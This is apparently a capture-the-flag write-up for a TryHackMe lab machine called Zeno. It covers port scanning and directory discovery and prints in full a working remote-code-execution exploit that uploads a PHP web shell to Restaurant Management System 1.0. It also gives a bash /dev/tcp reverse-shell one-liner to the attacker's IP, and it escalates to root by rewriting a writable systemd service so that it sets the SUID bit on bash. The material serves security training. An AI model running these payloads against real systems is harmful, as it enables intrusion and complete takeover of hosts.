# Zeno

# Nmap
```sh
┌──(kali㉿kali)-[~/THM/ZENO/recon/nmap]
└─$ nmap 10.10.251.31 -p- --min-rate 2000 -vv -oA allports -Pn
```

```sh
PORT      STATE SERVICE REASON
22/tcp    open  ssh     syn-ack
12340/tcp open  unknown syn-ack
```

```sh
┌──(kali㉿kali)-[~/THM/ZENO/recon/nmap]
└─$ nmap 10.10.251.31 -p22,12340 --min-rate 2000 -vv -oA allscsv -Pn -sC -sV
```
```sh
PORT      STATE SERVICE REASON  VERSION
22/tcp    open  ssh     syn-ack OpenSSH 7.4 (protocol 2.0)
| ssh-hostkey: 
|   2048 092362a2186283690440623297ff3ccd (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDakZyfnq0JzwuM1SD3YZ4zyizbtc9AOvhk2qCaTwJHEKyyqIjBaElNv4LpSdtV7y/C6vwUfPS34IO/mAmNtAFquBDjIuoKdw9TjjPrVBVjzFxD/9tDSe+cu6ELPHMyWOQFAYtg1CV1TQlm3p6WIID2IfYBffpfSz54wRhkTJd/+9wgYdOwfe+VRuzV8EgKq4D2cbUTjYjl0dv2f2Th8WtiRksEeaqI1fvPvk6RwyiLdV5mSD/h8HCTZgYVvrjPShW9XPE/wws82/wmVFtOPfY7WAMhtx5kiPB11H+tZSAV/xpEjXQQ9V3Pi6o4vZdUvYSbNuiN4HI4gAWnp/uqPsoR
|   256 33663536b0680632c18af601bc4338ce (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBEMyTtxVAKcLy5u87ws+h8WY+GHWg8IZI4c11KX7bOSt85IgCxox7YzOCZbUA56QOlryozIFyhzcwOeCKWtzEsA=
|   256 1498e3847055e6600cc20977f8b7a61c (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIOKY0jLSRkYg0+fTDrwGOaGW442T5k1qBt7l8iAkcuCk
12340/tcp open  http    syn-ack Apache httpd 2.4.6 ((CentOS) PHP/5.4.16)
|_http-server-header: Apache/2.4.6 (CentOS) PHP/5.4.16
|_http-title: We&#39;ve got some trouble | 404 - Resource not found
| http-methods: 
|   Supported Methods: GET HEAD POST OPTIONS TRACE
|_  Potentially risky methods: TRACE
```

# Web enumeration
```sh
┌──(kali㉿kali)-[~/THM/ZENO/recon/web]
└─$ gobuster dir -u http://10.10.251.31:12340 -w /usr/share/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -t 40 -x .php,.txt,.html 
...
/rms                  (Status: 301) [Size: 238] [--> http://10.10.251.31:12340/rms/]
...
```

# RMS exploit
RMS stands for Restaurant Management System
An exploit can be found with:
```sh
searchsploit restaurant management system
------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                          |  Path
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Restaurant Management System 1.0 - Remote Code Execution                                                                                                | php/webapps/47520.py
-------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```
The exploit needed some adjustedments and did not work immediately. Below the working exploit is found:
```python3
# Exploit Title: Restaurant Management System 1.0  - Remote Code Execution
# Date: 2019-10-16
# Exploit Author: Ibad Shah
# Vendor Homepage: https://www.sourcecodester.com/users/lewa
# Software Link: https://www.sourcecodester.com/php/11815/restaurant-management-system.html
# Version: N/A
# Tested on: Apache 2.4.41

#!/usr/bin/python

import requests
import sys

print ("""
    _  _   _____  __  __  _____   ______            _       _ _
  _| || |_|  __ \|  \/  |/ ____| |  ____|          | |     (_) |
 |_  __  _| |__) | \  / | (___   | |__  __  ___ __ | | ___  _| |_
  _| || |_|  _  /| |\/| |\___ \  |  __| \ \/ / '_ \| |/ _ \| | __|
 |_  __  _| | \ \| |  | |____) | | |____ >  <| |_) | | (_) | | |_
   |_||_| |_|  \_\_|  |_|_____/  |______/_/\_\ .__/|_|\___/|_|\__|
                                             | |
                                             |_|


""")
print ("Credits : All InfoSec (Raja Ji's) Group")
url = sys.argv[1]

if len(sys.argv[1]) < 8:
	print("[+] Usage : python rms-rce.py http://localhost:80/")
	exit()

print ("[+] Restaurant Management System Exploit, Uploading Shell")

target = url+"admin/foods-exec.php"



headers = {
    "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:69.0) Gecko/20100101 Firefox/69.0",
    "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8",
    "Accept-Language": "en-US,en;q=0.5",
    "Accept-Encoding": "gzip, deflate",
    "Content-Length": "327",
    "Content-Type": "multipart/form-data; boundary=---------------------------191691572411478",
    "Connection": "close",
	"Referer": "http://localhost:8081/rms/admin/foods.php",
	"Cookie": "PHPSESSID=4dmIn4q1pvs4b79",
	"Upgrade-Insecure-Requests": "1"

}

data = """

-----------------------------191691572411478
Content-Disposition: form-data; name="photo"; filename="reverse-shell.php"
Content-Type: text/html

<?php echo shell_exec($_GET["cmd"]); ?>
-----------------------------191691572411478
Content-Disposition: form-data; name="Submit"

Add
-----------------------------191691572411478--
"""
r = requests.post(target,verify=False, headers=headers,data=data)


print("[+] Shell Uploaded. Please check the URL : "+url+"images/reverse-shell.php")
```
 Run the exploit to execute commands on the target go to the given URL:

 http://10.10.98.202:12340/rms/images/reverse-shell.php?cmd=id

 To get a reverse shell we url encode `bash -i >& /dev/tcp/10.11.40.46/4444 0>&1` and execute it in the webshell
 ```sh
http://10.10.98.202:12340/rms/images/reverse-shell.php?cmd=bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2F10.11.40.46%2F4444%200%3E%261
```
No we have a shell as apache. 

# Privilege escaltion to edward
During enumeration we found another user 'edward' an with linpeas we found a password. Let's try logging in as that user via ssh.
```sh
ssh edward@10.10.98.202
```

Yes!! we have as shell as edward and can read the user flag.

Now we run linpeas again and we find out that we can write to a service. Let's read the file:
```sh
[edward@zeno ~]$ cat /etc/systemd/system/zeno-monitoring.service
[Unit]
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/root/zeno-monitoring.py

[Install]
WantedBy=multi-user.target
```
Here ExecStart is the main process of the service. Since we have write privileges to the file we can change the value of ExecStart. On the machine nano (my favorite editor) is not available to I copied the contents of the file to my own machine and changed the value of ExecStart
```sh
Description=Zeno monitoring

[Service]
Type=simple
User=root
ExecStart=/usr/bin/chmod +s /usr/bin/bash

[Install]
WantedBy=multi-user.target


[Install]
WantedBy=multi-user.target

```

Now the service will set the SUID bit on /usr/bin/bash on startup. We will be able to execute the file as the user who owns the file: root in this case. Sounds great to have a bash shell as root...

To change the file we convert the file to base64 and redirect the output to the service file:
```sh
[edward@zeno ~]$ echo "RGVzY3JpcHRpb249WmVubyBtb25pdG9yaW5nCgpbU2VydmljZV0KVHlwZT1zaW1wbGUKVXNlcj1y
> b290CkV4ZWNTdGFydD0vdXNyL2Jpbi9jaG1vZCArcyAvdXNyL2Jpbi9iYXNoCgpbSW5zdGFsbF0K
> V2FudGVkQnk9bXVsdGktdXNlci50YXJnZXQK" | base64 -d > /etc/systemd/system/zeno-monitoring.service
[edward@zeno ~]$ ls -al /etc/systemd/system/zeno-monitoring.service
```

In order to start the service we need to reboot the machine. During enumeration it was found that `/usr/bin/reboot` can be executed as sudo without password.
```sh
sudo reboot
```

After connecting again via ssh as the user edward we can simply type `bash -p` to get a root shell:






 



